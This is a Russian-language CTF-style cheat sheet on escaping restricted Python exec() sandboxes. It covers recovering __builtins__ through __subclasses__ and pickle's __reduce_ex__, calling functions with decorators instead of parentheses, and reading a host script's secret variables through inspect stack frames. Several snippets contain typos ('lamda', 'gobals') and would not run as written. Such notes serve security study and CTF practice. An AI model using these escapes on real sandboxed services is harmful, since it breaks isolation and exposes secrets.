# Python Sandbox

## Базовые трюки

### Получить любую строку

```python
# 1
bytes([20, 22, 24, 25]).decode()

# 2
func = lambda somestring: _
str_Somestring = func.__code__.co_varnames[0]
```

### Перенос строки без переноса строки

В Python возврат каретки `\r` то же самое, что и перенос строки `\n`.&#x20;

### unicode

Интерпретатору python все равно на unicode символы, он их попытается привести к ascii:

![](<../../../.gitbook/assets/изображение (32).png>)

## Работа с типами

### Создание класса

Пусть наш код запускается следующим образом (у нас ограничен `globals`)

```python
yourcode = 'result = 1 + 1'  # Здесь наш код
namespace = {
    '__builtins__': {},
    'result': None
}
exec(yourcode, namespace)
print(namespace['result'])
```

Без `__build_class__` в `builtins` нельзя создать класс:

```python
myfunc = lambda test:_        # Создаем функцию
gobals = myfunc.__globals__   # Получаем глобальные переменные скрипта
builtins = globals['__builtins__']  # Получаем ссылку на словарь, в котором определены все из пакета builtins (или не определены)
builtins['__build_class__'] = lamda *x: 3  # Здесь может быть любая функция

class C: pass  # теперь этот код не будет вызывать ошибки, если builtins нет в globals переменных
```

### Декораторы и вызов функций через них

Декораторы — это функции, которые в питоне могут быть представлены почти к чему угодно. Например, фунциям. С помощью декораторов можно организовать вызов какой-либо функции, не используя круглых скобок. Ограничение: вызвать можно только функции, которые принимают 1 аргумент (хорошо, что некоторые функции настроены на непозиционные аргументы или на кортежи аргументов). Пример:

```python
result = object()

returnedValues = []

@returnedValues.append
@result.__class__.__subclasses__
class X: pass
```

Другая форма вызова функции через декораторы:

```python
# 1
a = f(b)

# 2
f = lambda x: x + 1

@f
@lambda _:2  # b=2
class a:0    # a=3
```

## Sandboxes

### builtins через subclasses

Зачем нужен builtins? — это ключ к свободному выполнению кода в Python и за пределами контекста Python.&#x20;

```python
result = SomeObjectClassFromParentContext
builtins = [x for x in result.__class__.__subclasses__() if x.__name__ == "catch_warnings"][0]()._module.__builtins__
```

### builtins из ничего

Допустим вас запустили в контексте, где нет builtins. Как до него добраться без `__subclasses__()`и не имея ни одного объекта из внешнего контекста? (все методы во всех гайдах опираются на метод subclasses)

```python
yourcode = 'result = 1 + 1'  # Здесь наш код
namespace = {
    '__builtins__': {},
    'result': None
}
exec(yourcode, namespace)
print(namespace['result'])
```

Выбираемся (здесь как-то связано с pickle; пример без использования круглых скобок => без возможности вызова функций обычными способами):

```python
builtins['__build_class__'] = lamda *x: 3
result = ''
x = []

# ''.__reduce_ex__(3)
@x.append
@result.__reduce_ex__
class X:
  pass
  
# x — [(<function __newobj__ at 0x108e7b160>, (<class 'str'>, ''), None, None, None)]
builtins = x[0][0].__globals__['__builtins__']
```

reduce\_ex принимает номер версии протокола pickle. Прием выше будет работать с протоколом 2 и выше.

### Получаем доступ ко всем переменным в скрипте из builtins

Пример, что можно сделать, через builtins – например, получить доступ к переменным основного контекста. Пусть наш код запускается следующим способом:

```python
yourcode = 'result = 1 + 1'  # Здесь наш код
SECRET = 'it\'s secret'     # З
namespace = {
    '__builtins__': {},
    'result': None
}
exec(yourcode, namespace)
print(namespace['result'])
```

И пусть мы уже получили каким-либо способом builtins. Тогда, через пакет inspect мы можем получить доступ ко всему стеку вызова основного скрипта:

```python
Import = builtins['__import__']
stack = Import('inspect').stack()

for frameInfo in stack:
    if 'SECRET' in frameInfo.frame.f_locals:
        print(frameInfo.frame.f_locals['SECRET'])  # it's secret
```

## Links & Papers

HackTricks Gitbook: [https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes)

Таск [Эмиля Лернера](https://t.me/neexemil) на выход из песочницы python и его решение: [https://gist.github.com/Invizory/36b5c4e037548b940c831efe350162d2](https://gist.github.com/Invizory/36b5c4e037548b940c831efe350162d2)
